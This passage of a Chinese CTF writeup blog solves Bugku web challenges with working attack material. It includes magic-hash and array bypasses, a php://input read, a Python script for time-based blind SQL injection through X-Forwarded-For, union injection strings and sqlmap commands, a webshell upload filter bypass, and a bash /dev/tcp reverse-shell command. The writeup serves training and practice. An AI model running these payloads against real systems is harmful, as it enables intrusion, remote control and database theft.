1</code></p><p>ABCabc123</p></blockquote><p>登录一下拿到flag</p><blockquote><p>SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p></blockquote><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><blockquote><p><a href="http://120.24.86.145:9009/from.php" target="_blank" rel="noopener">http://120.24.86.145:9009/from.php</a> </p></blockquote><p>修改一下请求报头的referer</p><p>payload</p><blockquote><p>Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p></blockquote><blockquote><p>flag{bug-ku_ai_admin}</p></blockquote><h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><blockquote><p><a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a> </p></blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p><a href="http://120.24.86.145:9009/md5.php?a=s878926199a" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php?a=s878926199a</a></p></blockquote><blockquote><p>flag{md5_collision_is_easy} </p></blockquote><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><blockquote><p>各种绕过哟</p><p><a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>又是md5，数组大法好</p><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web7/index.php?uname[]=0&amp;id=margin" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/index.php?uname[]=0&amp;id=margin</a></p><p>passwd[]=1</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527180001110.png" alt="1527180001110"></p><blockquote><p>flag{HACK_45hhs_213sDD} </p></blockquote><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote><p>txt？？？？</p><p><a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web8/?ac=123456&amp;fn=php://input" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/?ac=123456&amp;fn=php://input</a></p><p>123456</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527180174518.png" alt="1527180174518"></p><blockquote><p>flag{3cfb7a90fc0de31}</p></blockquote><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>​        1. 把请求头里面的Content-Type字母改成大写进行绕过</p><p>​        2. .jpg后面加上.php5其他的都被过滤了好像..</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531387774496.png" alt="1531387774496"></p><p>参考链接</p><p><a href="https://blog.csdn.net/qq_40424939/article/details/80767321" target="_blank" rel="noopener">https://blog.csdn.net/qq_40424939/article/details/80767321</a></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a> </p><p>flag格式：flag{xxxxxxxxxxxx} </p><p>不如写个Python吧 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>XFF可以注入，过滤了’,’<br>时间盲注，两个trick<br>逗号过滤的情况下可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when xxx then xxx else xxx end</span><br></pre></td></tr></table></figure><p>substr的逗号可以用如下姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from x for 1</span><br></pre></td></tr></table></figure><p>最终可以构造如下payload,注意末尾多一个括号闭合之前的括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #</span><br></pre></td></tr></table></figure><p>上一个最终的注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/7/12</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-insert_into注入</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">data = <span class="string">"127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end)) #"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> mystring:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>: data.format(str(i), j)&#125;</span><br><span class="line">                res = requests.get(url, headers=headers, timeout=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>就双引号注入，都没有过滤什么</p><p>database：bugkusql1 </p><p>table：flag1,whoami </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select database(),2 %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(table_name) ,2 from information_schema.tables where table_schema = database() %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(column_name) ,2 from information_schema.columns where table_name= &apos;flag1&apos; %23</span><br><span class="line"></span><br><span class="line">admin_name=-1&quot; union select group_concat(flag1) ,2 from  flag1 %23</span><br></pre></td></tr></table></figure><p>sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;1.txt&quot; -p admin_name --dbs   //爆数据库，注入点为admin_name</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -p admin_name --tables   //爆表</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns   //爆字段</span><br><span class="line">sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump   //爆数据</span><br></pre></td></tr></table></figure><blockquote><p>flag{ed6b28e684817d9efcaf802979e57aea }</p></blockquote><h2 id="login3"><a href="#login3" class="headerlink" title="login3"></a>login3</h2><p>bool盲注</p><p><a href="https://doubler.cn/2018/04/27/BugKuCTF-Login3/" target="_blank" rel="noopener">https://doubler.cn/2018/04/27/BugKuCTF-Login3/</a></p><h2 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><blockquote><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a> </p><p>FLAG格式 Flag:”” </p></blockquote><blockquote><p>~3C3F706870206664736166617366647361666964736166647361696664736 616B6664736169666473616664736166664736166647361666B6473613B666 6473616664736166736461666473616 66617330686664736739466C61673A2 223732343966356137666431646536 </p><p>303262333065366633396165613631</p><p>393361226673646166736166647361 </p><p> 66647361666473616661203F3E0A </p></blockquote><blockquote><p>Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p></blockquote><p><a href="https://blog.csdn.net/qq_33417843/article/details/79766318" target="_blank" rel="noopener">Bugku ctf writeup–web篇–报错注入</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html</a></p><p><a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">MySQL updatexml()、extractvalue() 报错型SQL注入</a></p><p><a href="http://www.cnblogs.com/joy-nick/p/5774462.html" target="_blank" rel="noopener">http://www.cnblogs.com/joy-nick/p/5774462.html</a></p><p><a href="http://skysec.top/2017/07/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%E5%8E%9F%E7%90%86/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">sql注入的一些技巧原理</a></p><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><blockquote><p><a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a> </p><p>flag格式：SKCTF{xxxxxxxxxxxxxxxx} </p><p>hint:文件包含 </p></blockquote><p>writeup来自<a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/bugku-writeup4/</a></p><p>打开题目，在源代码中发现了<code>upload.php</code></p><p><img src="https://delcoding.github.io/images/posts/bugku/68.png" alt="img"> </p><p>  访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用<code>php</code>解析：</p><p><img src="https://delcoding.github.io/images/posts/bugku/69.png" alt="img"> </p><p>  上传一句话</p><p><img src="https://delcoding.github.io/images/posts/bugku/70.png" alt="img"> </p><p><img src="https://delcoding.github.io/images/posts/bugku/71.png" alt="img"> </p><p>  但是访问后发现存在过滤，<code>&lt;?php</code>被替换成<code>_</code>。如下图：</p><p><img src="https://delcoding.github.io/images/posts/bugku/72.png" alt="img"> </p><p>  但是我们可以使用<code>&lt;script language=php&gt; &lt;/script&gt;</code>标签绕过这个验证，我们再上传一次：</p><p><img src="https://delcoding.github.io/images/posts/bugku/73.png" alt="img"> </p><p><img src="https://delcoding.github.io/images/posts/bugku/74.png" alt="img"> </p><p>  可以看到，后台已经成功的解析了我们的<code>php代码</code>。接着使用菜刀连接。 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527762752303.png" alt="1527762752303"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527762738245.png" alt="1527762738245"></p><p>打开文件即可拿到flag</p><blockquote><p>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p></blockquote><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49165/" target="_blank" rel="noopener">http://118.89.219.210:49165/</a><br>SKCTF{xxxxxxxxxxxxxxxxxxxxx}<br>hint:union，命令执行</p></blockquote><p>对请求抓包，然后可以发现<code>tip</code>，解密出来是几行代码。</p><p><img src="https://delcoding.github.io/images/posts/bugku/104.png" alt="img"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里可以看到它是分离式的验证，首先查询<code>username</code>的用户，然后拿出<code>password</code>再进行比较，一开始想着是注入出<code>admin</code>的密码，但发现可能没有这个用户，而且也找不到注入的<code>poc</code>。后来参考网上的writeup才知道正确的打开方式。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure><p>  执行这条语句时由于前面的<code>username</code>为空，所以没有数据返回，但后面的<code>union select md5(1),md5(1)</code>则会返回两个MD5(1)的值，然后<code>password</code>我们也置为<code>1</code>，从而绕过<code>if</code>语句的判断。</p><p>  接下来可以进入命令执行的页面。</p><p><img src="https://delcoding.github.io/images/posts/bugku/105.png" alt="img"> </p><p>  然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></figure><p>  然后执行反弹shell的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的公网ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>  最后就能在服务器上收到shell，然后查询flag。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527776289893.png" alt="1527776289893"></p><blockquote><p>SKCTF{Uni0n_@nd_c0mM4nD_exEc}</p></blockquote><p><a href="https://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">bugku login2 writeup 不使用vps的方法</a></p><p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">bugku平台 login2 writeup</a></p><p><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">Linux渗透之反弹Shell命令解析</a></p><p><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">linux下反弹shell的姿势</a></p><p><a href="https://www.bandwagonhost.net/399.html" target="_blank" rel="noopener">vps登录ssh</a></p><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" 